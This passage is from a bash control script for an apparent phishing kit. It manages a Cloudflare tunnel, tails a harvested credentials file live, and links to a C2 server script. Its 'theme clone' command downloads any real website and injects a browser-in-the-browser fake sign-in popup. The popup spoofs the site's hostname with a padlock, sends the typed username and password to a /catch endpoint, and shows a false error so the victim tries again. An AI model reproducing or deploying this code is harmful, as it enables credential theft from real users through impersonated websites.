    URL=$(grep -rh -o 'https://[a-z0-9-]*\.trycloudflare\.com' \
        "$OP/logs/tunnel.log" /tmp/cf*.log 2>/dev/null | tail -1)
    if [ -n "$URL" ]; then
        echo "$URL"
    else
        echo "No active tunnel. Run:  bash start up"
    fi
}

cmd_creds() {
    mkdir -p "$OP/logs" /tmp/op/logs
    touch "$OP/logs/credentials.txt" /tmp/op/logs/credentials.txt
    echo -e "\n  ${Y}Watching credentials — Ctrl+C to stop${N}\n"
    # Show existing entries first
    cat "$OP/logs/credentials.txt" /tmp/op/logs/credentials.txt 2>/dev/null | sort -u
    echo -e "  ${C}── live ────────────────────────────────────${N}"
    tail -f "$OP/logs/credentials.txt" /tmp/op/logs/credentials.txt 2>/dev/null
}

cmd_logs() {
    echo -e "\n  ${Y}Tailing all logs — Ctrl+C to stop${N}\n"
    tail -f "$OP/logs/"*.log "$OP/logs/credentials.txt" 2>/dev/null
}

cmd_theme() {
    local sub="${1:-list}"
    case "$sub" in

        list)
            echo ""
            echo -e "  ${Y}Available themes:${N}"
            echo ""
            ACTIVE=$(readlink -f "$BITB_DIR/index.html" 2>/dev/null || echo "")
            for d in "$OP/bitb/themes"/*/; do
                name=$(basename "$d")
                active_mark=""
                if diff -q "$d/index.html" "$BITB_DIR/index.html" > /dev/null 2>&1; then
                    active_mark="${G} ← active${N}"
                fi
                echo -e "  ${C}$name${N}$active_mark"
            done
            echo ""
            echo -e "  ${W}Drop a custom theme:${N}  $OP/bitb/themes/<name>/index.html"
            echo -e "  ${W}Switch theme:${N}         bash start theme use <name>"
            echo -e "  ${W}New blank template:${N}   bash start theme new <name>"
            echo -e "  ${W}Clone a real site:${N}    bash start theme clone <url>"
            echo ""
            ;;

        use)
            local name="$2"
            if [ -z "$name" ]; then
                err "Usage: bash start theme use <name>"; return 1
            fi
            local src="$OP/bitb/themes/$name/index.html"
            if [ ! -f "$src" ]; then
                err "Theme not found: $name"
                info "Available: $(ls "$OP/bitb/themes/" | tr '\n' ' ')"
                return 1
            fi
            cp "$src" "$BITB_DIR/index.html"
            ok "Active theme → $name  (takes effect immediately, no restart needed)"
            ;;

        new)
            local name="${2:-custom}"
            local dst="$OP/bitb/themes/$name"
            if [ -d "$dst" ]; then
                warn "Theme '$name' already exists at $dst/index.html"
                return
            fi
            mkdir -p "$dst"
            cp "$OP/bitb/themes/blank/index.html" "$dst/index.html"
            ok "Created: $dst/index.html"
            info "Edit it, then activate with: bash start theme use $name"
            ;;

        clone)
            local url="$2"
            if [ -z "$url" ]; then
                err "Usage: bash start theme clone <url>"; return 1
            fi
            local cname
            cname=$(echo "$url" | sed 's|https\?://||;s|/.*||;s|www\.||;s|\.[^.]*$||')
            local dst="$OP/bitb/themes/$cname"
            mkdir -p "$dst"
            info "Fetching $url ..."
            if curl -s -A "Mozilla/5.0" --max-time 15 -L "$url" -o "$dst/raw.html" 2>/dev/null; then
                # Use Python to inject <base> tag (fixes all assets) + BitB popup
                python3 - "$dst/raw.html" "$dst/index.html" "$url" << 'PYEOF'
import sys, re

src, dst, url = sys.argv[1], sys.argv[2], sys.argv[3]

html = open(src, encoding="utf-8", errors="replace").read()

base_tag = f'<base href="{url.rstrip("/")}/">'

inject = r"""
<style>
#__bov{display:none;position:fixed;inset:0;background:rgba(0,0,0,.6);z-index:99999;align-items:center;justify-content:center;font-family:Arial,sans-serif;}
#__bov.show{display:flex;}
#__bw{width:440px;border-radius:10px;overflow:hidden;box-shadow:0 20px 60px rgba(0,0,0,.5);}
#__btb{background:#dee1e6;padding:8px 10px 6px;display:flex;align-items:center;gap:8px;}
.bdot{width:13px;height:13px;border-radius:50%;display:inline-block;}
#__bub{flex:1;background:white;border-radius:20px;padding:3px 12px;display:flex;align-items:center;gap:6px;font-size:13px;color:#333;}
#__bd{background:white;padding:32px 36px 28px;}
#__bd h2{text-align:center;font-size:18px;color:#222;margin-bottom:6px;}
#__bd .bsub{text-align:center;font-size:13px;color:#666;margin-bottom:22px;}
#__bd label{font-size:13px;color:#333;display:block;margin-bottom:4px;}
#__bd input{width:100%;padding:9px 12px;border:1px solid #ccc;border-radius:4px;font-size:14px;margin-bottom:14px;outline:none;box-sizing:border-box;}
#__bsb{width:100%;padding:10px;background:#1a73e8;color:white;border:none;border-radius:4px;font-size:15px;cursor:pointer;}
#__be{display:none;color:#d93025;font-size:13px;margin-top:-8px;margin-bottom:10px;}
</style>
<div id="__bov">
 <div id="__bw">
  <div id="__btb">
   <div><span class="bdot" id="__bcl" style="background:#ff5f57;cursor:pointer"></span>
        <span class="bdot" style="background:#ffbd2e"></span>
        <span class="bdot" style="background:#28c840"></span></div>
   <div id="__bub">&#128274;&nbsp;<strong id="__bdm"></strong></div>
   <button id="__bxb" style="background:none;border:none;font-size:18px;cursor:pointer;color:#666;">&#x2715;</button>
  </div>
  <div id="__bd">
   <h2>Sign in</h2><p class="bsub">Enter your credentials to continue</p>
   <form id="__bf">
    <label>Username or email</label><input type="text" id="__bu" placeholder="username" required>
    <label>Password</label><input type="password" id="__bp" placeholder="password" required>
    <p id="__be">Invalid username or password.</p>
    <button type="submit" id="__bsb">Sign in</button>
   </form>
  </div>
 </div>
</div>
<script>
(function(){
  var ov=document.getElementById("__bov");
  document.getElementById("__bdm").textContent=window.location.hostname;
  function hideB(){ov.classList.remove("show");}
  document.getElementById("__bcl").onclick=hideB;
  document.getElementById("__bxb").onclick=hideB;
  ov.addEventListener("click",function(e){if(e.target===ov)hideB();});
  document.getElementById("__bf").addEventListener("submit",function(e){
    e.preventDefault();
    var u=document.getElementById("__bu").value,p=document.getElementById("__bp").value;
    fetch("/catch",{method:"POST",headers:{"Content-Type":"application/json"},
      body:JSON.stringify({user:u,pass:p,ts:new Date().toISOString(),src:"clone"})}).catch(function(){});
    var b=document.getElementById("__bsb");b.textContent="Signing in\u2026";b.disabled=true;
    setTimeout(function(){
      document.getElementById("__be").style.display="block";
      b.textContent="Sign in";b.disabled=false;
      document.getElementById("__bp").value="";
      document.getElementById("__bp").focus();
    },1800);
  });
  setTimeout(function(){ov.classList.add("show");document.getElementById("__bu").focus();},600);
})();
</script>
"""

# Inject <base> into <head>
if re.search(r'<head[^>]*>', html, re.I):
    html = re.sub(r'(<head[^>]*>)', lambda m: m.group(0) + base_tag, html, count=1, flags=re.I)
else:
    html = base_tag + html

# Inject popup before </body> or at end
if re.search(r'</body>', html, re.I):
    html = re.sub(r'</body>', lambda m: inject + '</body>', html, count=1, flags=re.I)
else:
    html += inject

open(dst, "w", encoding="utf-8").write(html)
print("OK")
PYEOF
                rm -f "$dst/raw.html"
                ok "Cloned $url → theme '$cname'"
                ok "Assets fixed via <base> tag — images/CSS load from original site"
                info "Activate with: bash start theme use $cname"
            else
                err "Failed to fetch $url"
                return 1
            fi
            ;;

        *)
            err "Unknown theme subcommand: $sub"
            info "Use: list | use <name> | new <name> | clone <url>"
            ;;
    esac
}

cmd_edit() {
    case "$1" in
        bitb) nano "$BITB_DIR/index.html" ;;
        c2)   nano "$C2_DIR/c2_server.py" ;;
        *)
            err "Unknown target. Use: edit bitb  OR  edit c2"
            ;;
    esac
}

